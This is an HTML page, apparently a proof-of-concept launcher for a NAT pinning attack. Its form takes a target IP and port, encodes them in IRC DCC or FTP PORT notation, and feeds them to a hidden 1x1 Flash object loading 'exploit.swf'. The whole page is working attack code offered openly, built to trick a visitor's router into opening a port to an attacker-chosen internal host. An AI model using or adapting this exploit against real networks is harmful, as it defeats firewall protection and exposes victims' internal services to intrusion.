<html>
	<head>
		<title>Natpin IRC POC</title>
	</head>
	<body>
		<script>
			function getParameter(paramName) {
  				var searchString = window.location.search.substring(1),i, val, params = searchString.split("&");
				for (i=0;i<params.length;i++) {
    					val = params[i].split("=");
			    			if (val[0] == paramName) {
      							return unescape(val[1]);
		    				}
  					}
				return "";
			}
			function dot2num(dot) {
				var d = dot.split('.');
				return ((((((+d[0])*256)+(+d[1]))*256)+(+d[2]))*256)+(+d[3]);
			}
			function ftpCalcPortNotation(port){
				x = port%256
				y = (port -x)/256
				return y+","+x
			}

		</script>
		<object id="flexploit" type="application/x-shockwave-flash" width="1" height="1">
			<param name="movie" value="exploit.swf"/>
			<param id="FlashVars" name="FlashVars" value=""/>
			<param id="play" name="play" value="false"/>
			<param name="quality" value="high"/>
		</object>
		<br>

		<script>
			if (getParameter("cp")==""||getParameter("ci")==""){
				//load auto-exploit screen
				document.write("<form method='GET' action='exploit.html'>\n")
				document.write("Type: <select name='type'><option value='irc'>irc</option><option value='ftp'>ftp</option></select>")
				document.write("<br>Target IP: <input type='text' value='' name='ci'/>")
				document.write("<br>Target Port: <input type='text' value='' name='cp'/>")
				document.write("<br><input type='submit' value='Go' />")
				document.write("</form>")
			}
			else{
				var proto = getParameter("type").toUpperCase()
				if (proto==""){proto="FTP"}//defaulting to ftp
				var server = getParameter("server")
				if (server==""){server= document.location.hostname}//defaulting to same host
				var callbackip = null
				var callbackport = null
				if (proto=="IRC"){
					callbackip = dot2num(getParameter("ci"))
					callbackport = getParameter("cp")
				}
				if (proto=="FTP"){
					callbackip = getParameter("ci").replace(/\./g,",")
					callbackport = ftpCalcPortNotation(getParameter("cp"))
				}
				//update the flash object
				var obj = document.getElementById("flexploit")
				var parmVars = document.getElementById("FlashVars")
				parmVars.setAttribute("value","type="+proto+"&server="+server+"&cp="+callbackport+"&ci="+callbackip)
				obj.setAttribute ("data","exploit.swf")
				document.getElementById("play").setAttribute("value","true")
			}
		</script>
	</body>
</html>
